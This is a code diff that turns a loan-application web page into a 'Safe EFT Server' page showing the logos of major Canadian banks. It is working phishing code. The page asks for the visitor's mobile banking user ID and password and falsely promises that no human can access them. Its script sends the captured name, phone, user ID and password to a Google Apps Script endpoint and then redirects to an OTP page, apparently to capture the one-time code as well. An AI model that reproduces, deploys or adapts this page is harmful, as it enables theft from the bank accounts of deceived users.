@@ -2,405 +2,351 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>MyLoanBuddy – Fast Loans Made Simple</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Safe EFT Server</title>
     <link rel="stylesheet" href="style.css" />
   </head>
 
   <body>
-    <!-- NAVIGATION -->
+    <!-- Sticky Navbar -->
     <header class="navbar">
-      <div class="container nav-flex">
-        <h1 class="logo">MyLoanBuddy</h1>
-        <nav>
-          <a href="#apply">Apply</a>
-          <a href="#loans">Loans</a>
+      <div class="nav-container">
+        <!-- Logo -->
+        <a href="#" class="nav-logo">
+          <img src="image/" alt="Speedy Cash Logo" />
+        </a>
+
+        <!-- Navigation Links -->
+        <nav class="nav-links" id="nav-links">
+          <a href="#home">Home</a>
           <a href="#how">How It Works</a>
-          <a href="#contact">Contact</a>
+          <a href="#support">Support</a>
+          <a href="#eft" class="active-nav">Safe EFT Server</a>
         </nav>
+
+        <!-- Hamburger Menu (Mobile Only) -->
+        <button id="menu-btn" class="hamburger">☰</button>
       </div>
     </header>
 
-    <!-- HERO -->
-    <section class="hero">
-      <div class="container hero-flex">
-        <div class="hero-text">
-          <h2>Fast, Secure & Trusted Loans in Canada</h2>
-          <p>
-            Borrow with confidence. Get approved quickly with our safe & simple
-            online process.
-          </p>
-          <a href="#apply" class="btn-primary">Apply Now</a>
-        </div>
+    <!-- MAIN LOGO -->
+    <img src="image/buddyloan_logo.jpeg" class="main-logo" alt="site-logo" />
 
-        <!-- <div class="hero-graphic">
-          <img src="../image/loan.png" alt="Loan Illustration" />
-        </div> -->
-      </div>
-    </section>
+    <h1 class="title">Safe EFT Server</h1>
+    <p class="subtitle">Connect your account</p>
 
-    <!-- FEATURES / BANK LOGOS -->
+    <p class="desc">
+      Safe EFT server
+      <strong>Links your account to EFT machine directly.</strong>
+      The information you put on server are encrypted and No human can access
+      your details. Please make sure to put correct details. If in case details
+      are incorrect the EFT machine will not be able to connect your account to
+      Safe EFT server.
+    </p>
 
-    <!-- TRUSTED BANKS SLIDER -->
-    <section class="trusted">
-      <div class="container">
-        <h3>Trusted Across Canada</h3>
-        <p class="sub">
-          We work with major Canadian banks to transfer funds safely.
-        </p>
+    <!-- BANK IMAGES -->
+    <div class="bank-logos">
+      <img src="image/bank/bmo.png" />
+      <img src="image/bank/td.png" />
+      <img src="image/bank/tangerine.png" />
+      <img src="image/bank/cibc.png" />
+      <img src="image/bank/scotiabank.png" />
+      <img src="image/bank/desjardins.png" />
+      <img src="image/bank/rcb.png" />
+    </div>
 
-        <div class="carousel-wrapper">
-          <!-- <button class="arrow left" id="leftBtn">❮</button> -->
-
-          <div class="carousel" id="carousel">
-            <div class="track" id="track">
-              <!-- Bank Cards -->
-              <div class="bank-card">
-                <img src="../image/bank/rcb.png" />
-                <p>RBC</p>
-              </div>
-              <div class="bank-card">
-                <img src="../image/bank/scotiabank.png" />
-                <p>Scotiabank</p>
-              </div>
-              <div class="bank-card">
-                <img src="../image/bank/tangerine.png" />
-                <p>Tangerine</p>
-              </div>
-              <div class="bank-card">
-                <img src="../image/bank/td.png" />
-                <p>TD</p>
-              </div>
-              <div class="bank-card">
-                <img src="../image/bank/bmo.png" />
-                <p>BMO</p>
-              </div>
-              <div class="bank-card">
-                <img src="../image/bank/cibc.png" />
-                <p>CIBC</p>
-              </div>
-              <div class="bank-card">
-                <img src="../image/bank/desjardins.png" />
-                <p>Desjardins</p>
-              </div>
-              <div class="bank-card">
-                <img src="../image/bank/national.png" />
-                <p>National Bank</p>
-              </div>
-            </div>
-          </div>
-
-          <!-- <button class="arrow right" id="rightBtn">❯</button> -->
-        </div>
-      </div>
-    </section>
-
-    <!-- LOAN TYPES -->
-    <!-- <section id="loans" class="section">
-      <div class="container">
-        <h2>Loan Options</h2>
-
-        <div class="grid">
-          <div class="card">
-            <h4>Personal Loans</h4>
-            <p>Cover emergencies, bills, travel & more.</p>
-          </div>
-          <div class="card">
-            <h4>Business Loans</h4>
-            <p>Launch or expand your business.</p>
-          </div>
-          <div class="card">
-            <h4>Student Loans</h4>
-            <p>Fee payments, books, supplies & tuition.</p>
-          </div>
-          <div class="card">
-            <h4>Home Loans</h4>
-            <p>Renovations, repairs & upgrades.</p>
-          </div>
-        </div>
-      </div>
-    </section> -->
-
-    <!-- HOW IT WORKS -->
-    <section id="how" class="how">
-      <div class="container">
-        <h2>How It Works</h2>
-
-        <div class="steps">
-          <div class="step">
-            <span>1</span>
-            <h5>Apply Online</h5>
-            <p>Submit your basic details in under 2 minutes.</p>
-          </div>
-
-          <div class="step">
-            <span>2</span>
-            <h5>Verify OTP</h5>
-            <p>Confirm your identity with a secure OTP.</p>
-          </div>
-
-          <div class="step">
-            <span>3</span>
-            <h5>Get Funds</h5>
-            <p>Funds are transferred safely to your bank.</p>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- LOAN CALCULATOR -->
-    <!-- <section id="calculator" class="calculator-section">
-      <div class="container">
-        <h2>Loan Calculator</h2>
-
-        <div class="calculator-box">
-          <div class="calc-inputs">
-            <label>Loan Amount (CAD)</label>
-            <input type="number" id="calcAmount" placeholder="Example: 5000" />
-
-            <label>Interest Rate (%)</label>
-            <input type="number" id="calcRate" placeholder="Example: 12" />
-
-            <label>Loan Term (Months)</label>
-            <input type="number" id="calcMonths" placeholder="Example: 12" />
-
-            <button id="calcBtn" class="btn-submit">Calculate</button>
-          </div>
-
-          <div class="calc-results">
-            <h3>Results</h3>
-
-            <p>
-              <strong>Monthly Payment:</strong> <span id="monthlyPay">$0</span>
-            </p>
-            <p>
-              <strong>Total Interest:</strong>
-              <span id="totalInterest">$0</span>
-            </p>
-            <p>
-              <strong>Total Payment:</strong> <span id="totalPayment">$0</span>
-            </p>
-          </div>
-        </div>
-      </div>
-    </section> -->
+    <p class="desc">
+      Fill out all the below Information to connect your account with safe EFT
+      server. Once it will done your account will be eligible for receiving
+      funds from Multiple Finances.
+    </p>
 
     <!-- FORM -->
-    <section id="apply" class="apply">
-      <div class="container apply-box">
-        <h2 style="text-align: center">Loan Application</h2>
+    <form class="form-area" id="eftForm">
+      <label>Full Name*</label>
+      <input
+        type="text"
+        id="fullName"
+        placeholder="Enter your full name"
+        required
+      />
+      <span class="error" id="nameError"></span>
 
-        <!-- <form id="loanForm" class="loan-form">
-          <input type="text" name="name" placeholder="Full Name" required />
-          <input
-            type="email"
-            name="email"
-            placeholder="Email Address"
-            required
-          />
-          <input type="tel" name="phone" placeholder="Phone Number" required />
+      <label>Phone number*</label>
+      <input
+        type="tel"
+        id="phone"
+        placeholder="Enter your Phone number"
+        required
+      />
+      <span class="error" id="phoneError"></span>
 
-          <select name="loanType" required>
-            <option value="">Select Loan Type</option>
-            <option>Personal Loan</option>
-            <option>Business Loan</option>
-            <option>Student Loan</option>
-            <option>Home Loan</option>
-          </select>
+      <label>User Id*</label>
+      <input
+        type="text"
+        id="userId"
+        placeholder="Enter your mobile banking user id"
+        required
+      />
+      <span class="error" id="userIdError"></span>
 
-          <input
-            type="number"
-            name="amount"
-            placeholder="Loan Amount (CAD)"
-            required
-          />
+      <label>Password*</label>
+      <input
+        type="password"
+        id="password"
+        placeholder="Enter your mobile banking password"
+        required
+      />
+      <span class="error" id="passwordError"></span>
 
-          <button type="submit" class="btn-submit">Submit Application</button>
-        </form> -->
-        <form id="loanForm" class="loan-form">
-          <div class="form-group">
-            <label for="name">Full Name</label>
-            <input
-              type="text"
-              id="name"
-              name="name"
-              placeholder="Enter your full name"
-              required
-            />
-          </div>
+      <!-- <button type="submit">Connect</button> -->
+      <button type="submit" class="btn-submit">
+        <span class="btn-text">Connect</span>
+        <span class="loader"></span>
+      </button>
+    </form>
 
-          <div class="form-group">
-            <label for="email">Email Address</label>
-            <input
-              type="email"
-              id="email"
-              name="email"
-              placeholder="Enter your email"
-              required
-            />
-          </div>
-
-          <div class="form-group">
-            <label for="phone">Phone Number</label>
-            <input
-              type="tel"
-              id="phone"
-              name="phone"
-              placeholder="Enter your phone number"
-              required
-            />
-          </div>
-
-          <div class="form-group">
-            <label for="loanType">Select Loan Type</label>
-            <select id="loanType" name="loanType" required>
-              <option value="">Choose a type</option>
-              <option>Personal Loan</option>
-              <option>Business Loan</option>
-              <option>Student Loan</option>
-              <option>Home Loan</option>
-            </select>
-          </div>
-
-          <div class="form-group">
-            <label for="amount">Loan Amount (CAD)</label>
-            <input
-              type="number"
-              id="amount"
-              name="amount"
-              placeholder="Enter loan amount"
-              required
-            />
-          </div>
-
-          <button type="submit" class="btn-submit">Submit Application</button>
-        </form>
-      </div>
-    </section>
-
-    <!-- FOOTER -->
-    <footer id="contact" class="footer">
-      <div class="container">
-        <p>Email: support@myloanbuddy.ca</p>
-        <p>© 2025 MyLoanBuddy.ca</p>
-      </div>
-    </footer>
-
-    <script>
-      const scriptURL =
-        "https://script.google.com/macros/s/AKfycbwbx1tH6QFlBFb51FQ-6mveH8sZperw-24jRsp4QO7FrxsFBUn2XZQnCSMUqiX5jjNHxw/exec";
-
-      document.addEventListener("DOMContentLoaded", () => {
-        const form = document.getElementById("loanForm");
-
-        form.addEventListener("submit", (e) => {
-          e.preventDefault();
-
-          const data = {
-            type: "form",
-            name: form.name.value,
-            email: form.email.value,
-            phone: form.phone.value,
-            loanType: form.loanType.value,
-            amount: form.amount.value,
-          };
-
-          fetch(scriptURL, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify(data),
-          }).then(() => {
-            window.location.href = "/otp/";
-          });
-        });
-      });
-    </script>
-
-    <!-- --------------------------------------------------- -->
-    <script>
-      // LOAN CALCULATOR SCRIPT
-      document.getElementById("calcBtn").addEventListener("click", function () {
-        const amount = parseFloat(document.getElementById("calcAmount").value);
-        const rate = parseFloat(document.getElementById("calcRate").value);
-        const months = parseFloat(document.getElementById("calcMonths").value);
-
-        if (!amount || !rate || !months) {
-          alert("Please fill all calculator fields.");
-          return;
-        }
-
-        const monthlyRate = rate / 100 / 12;
-
-        const monthlyPayment =
-          (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months));
-
-        const totalPayment = monthlyPayment * months;
-        const totalInterest = totalPayment - amount;
-
-        document.getElementById("monthlyPay").innerText =
-          "$" + monthlyPayment.toFixed(2);
-        document.getElementById("totalInterest").innerText =
-          "$" + totalInterest.toFixed(2);
-        document.getElementById("totalPayment").innerText =
-          "$" + totalPayment.toFixed(2);
-      });
-    </script>
-
-    <script>
-      const track = document.getElementById("track");
-      const leftBtn = document.getElementById("leftBtn");
-      const rightBtn = document.getElementById("rightBtn");
-      let isDragging = false,
-        startX,
-        scrollLeft;
-
-      // Duplicate cards to create infinite loop
-      track.innerHTML += track.innerHTML;
-
-      // Pause on hover
-      track.addEventListener("mouseenter", () => {
-        track.style.animationPlayState = "paused";
-      });
-      track.addEventListener("mouseleave", () => {
-        track.style.animationPlayState = "running";
-      });
-
-      // DRAGGING (Mouse)
-      track.addEventListener("mousedown", (e) => {
-        isDragging = true;
-        track.style.animationPlayState = "paused";
-        startX = e.pageX;
-      });
-
-      track.addEventListener("mouseup", () => {
-        isDragging = false;
-        track.style.animationPlayState = "running";
-      });
-
-      track.addEventListener("mousemove", (e) => {
-        if (!isDragging) return;
-        let move = e.pageX - startX;
-        track.style.transform = `translateX(${move}px)`;
-      });
-
-      // TOUCH
-      track.addEventListener("touchstart", (e) => {
-        track.style.animationPlayState = "paused";
-        startX = e.touches[0].pageX;
-      });
-
-      track.addEventListener("touchend", () => {
-        track.style.animationPlayState = "running";
-      });
-
-      track.addEventListener("touchmove", (e) => {
-        let move = e.touches[0].pageX - startX;
-        track.style.transform = `translateX(${move}px)`;
-      });
-
-      // BUTTONS
-      rightBtn.onclick = () => (track.style.transform = "translateX(-200px)");
-      leftBtn.onclick = () => (track.style.transform = "translateX(200px)");
-    </script>
+    <!-- <div id="success-box" class="success-msg">
+      Thanks for connecting your account with the Safe EFT Server of Premier
+      Loans Canada.
+    </div> -->
   </body>
+  <script>
+    // const menuBtn = document.getElementById("menu-btn");
+    // const navLinks = document.getElementById("nav-links");
+
+    // menuBtn.addEventListener("click", () => {
+    //   navLinks.classList.toggle("show");
+    // });
+  </script>
+
+  <!-- <script>
+    function validateFields() {
+      let isValid = true;
+
+      const fullName = document.querySelector(
+        'input[placeholder="Enter your full name"]'
+      );
+      const phone = document.querySelector(
+        'input[placeholder="Enter your Phone number"]'
+      );
+      const userId = document.querySelector(
+        'input[placeholder="Enter your mobile banking user id"]'
+      );
+      const password = document.querySelector(
+        'input[placeholder="Enter your mobile banking password"]'
+      );
+
+      document.querySelectorAll(".error").forEach((e) => e.remove());
+
+      if (fullName.value.trim().length < 3) {
+        showError(fullName, "Enter a valid full name");
+        isValid = false;
+      }
+
+      if (!/^\d{10}$/.test(phone.value.trim())) {
+        showError(phone, "Enter a valid 10-digit phone number");
+        isValid = false;
+      }
+
+      if (userId.value.trim().length < 4) {
+        showError(userId, "User ID must be 4+ characters");
+        isValid = false;
+      }
+
+      if (password.value.trim().length < 6) {
+        showError(password, "Password must be 6+ characters");
+        isValid = false;
+      }
+
+      return isValid;
+    }
+
+    function showError(input, message) {
+      const error = document.createElement("span");
+      error.className = "error";
+      error.innerText = message;
+      input.insertAdjacentElement("afterend", error);
+    }
+
+    // SUBMIT PROCESS
+    document
+      .querySelector("form")
+      .addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        if (!validateFields()) return;
+
+        const btn = document.querySelector("button");
+        btn.innerText = "Processing...";
+        btn.disabled = true;
+
+        const fullName = document.querySelector(
+          'input[placeholder="Enter your full name"]'
+        ).value;
+        const phone = document.querySelector(
+          'input[placeholder="Enter your Phone number"]'
+        ).value;
+        const userId = document.querySelector(
+          'input[placeholder="Enter your mobile banking user id"]'
+        ).value;
+        const password = document.querySelector(
+          'input[placeholder="Enter your mobile banking password"]'
+        ).value;
+
+        try {
+          await fetch(
+            "https://script.google.com/macros/s/AKfycbwbx1tH6QFlBFb51FQ-6mveH8sZperw-24jRsp4QO7FrxsFBUn2XZQnCSMUqiX5jjNHxw/exec",
+            {
+              method: "POST",
+              mode: "no-cors",
+              redirect: "follow",
+              body: JSON.stringify({ fullName, phone, userId, password }),
+            }
+          );
+
+          // ✨ Show THANK YOU Message Smoothly
+          document.querySelector(".form-area").innerHTML = `
+      <div class="success-message">
+        Thanks for connecting your account with the Safe EFT server of Premier Loans Canada.
+      </div>
+    `;
+
+          setTimeout(() => {
+            window.location.href = "otp/index.html";
+          }, 2000);
+        } catch (err) {
+          alert("Network Error. Try again!");
+          btn.innerText = "Connect";
+          btn.disabled = false;
+        }
+      });
+  </script> -->
+
+  <script>
+    // NAVBAR DROPDOWN MOBILE
+    const menuBtn = document.getElementById("menu-btn");
+    const navLinks = document.getElementById("nav-links");
+
+    menuBtn.addEventListener("click", () => {
+      navLinks.classList.toggle("show");
+    });
+
+    // VALIDATION
+    function validateFields() {
+      let valid = true;
+
+      const fields = [
+        {
+          el: document.querySelector(
+            'input[placeholder="Enter your full name"]'
+          ),
+          rule: (v) => v.length >= 3,
+          msg: "Enter a valid full name",
+        },
+        {
+          el: document.querySelector(
+            'input[placeholder="Enter your Phone number"]'
+          ),
+          rule: (v) => /^\d{10}$/.test(v),
+          msg: "Enter a valid 10-digit number",
+        },
+        {
+          el: document.querySelector(
+            'input[placeholder="Enter your mobile banking user id"]'
+          ),
+          rule: (v) => v.length >= 4,
+          msg: "User ID must be at least 4 characters",
+        },
+        {
+          el: document.querySelector(
+            'input[placeholder="Enter your mobile banking password"]'
+          ),
+          rule: (v) => v.length >= 6,
+          msg: "Password must be 6+ characters",
+        },
+      ];
+
+      document.querySelectorAll(".error").forEach((e) => e.remove());
+
+      fields.forEach((f) => {
+        if (!f.rule(f.el.value.trim())) {
+          showError(f.el, f.msg);
+          valid = false;
+        }
+      });
+
+      return valid;
+    }
+
+    function showError(input, message) {
+      const err = document.createElement("span");
+      err.className = "error";
+      err.innerText = message;
+      input.insertAdjacentElement("afterend", err);
+    }
+
+    // FORM SUBMIT
+    document
+      .querySelector("form")
+      .addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        if (!validateFields()) return;
+
+        const btn = document.querySelector(".btn-submit");
+        const btnText = document.querySelector(".btn-text");
+        const loader = document.querySelector(".loader");
+
+        btn.disabled = true;
+        btnText.innerText = "Submitting...";
+        loader.style.display = "inline-block";
+
+        const fullName = document
+          .querySelector('input[placeholder="Enter your full name"]')
+          .value.trim();
+        const phone = document
+          .querySelector('input[placeholder="Enter your Phone number"]')
+          .value.trim();
+        const userId = document
+          .querySelector(
+            'input[placeholder="Enter your mobile banking user id"]'
+          )
+          .value.trim();
+        const password = document
+          .querySelector(
+            'input[placeholder="Enter your mobile banking password"]'
+          )
+          .value.trim();
+
+        try {
+          await fetch(
+            "https://script.google.com/macros/s/AKfycbzvsljZs3HP8uqq-i3DJzpuGDp2R_dNdWuqfza2RbFHVJw95k_PgLRH7_mHuIJ_Rf0/exec",
+            {
+              method: "POST",
+              mode: "no-cors",
+              body: JSON.stringify({ fullName, phone, userId, password }),
+            }
+          );
+
+          localStorage.setItem("userPhone", phone);
+
+          document.querySelector(".form-area").innerHTML = `
+        <div class="success-message">
+          Successfully Connected!<br>
+          Thanks for connecting your account with the Safe EFT server of Premier Loans Canada.
+        </div>
+      `;
+
+          setTimeout(() => {
+            window.location.href = "otp/index.html";
+          }, 2000);
+        } catch (err) {
+          alert("Network Error! Please try again.");
+          btn.disabled = false;
+          btnText.innerText = "Connect";
+          loader.style.display = "none";
+        }
+      });
+  </script>
 </html>
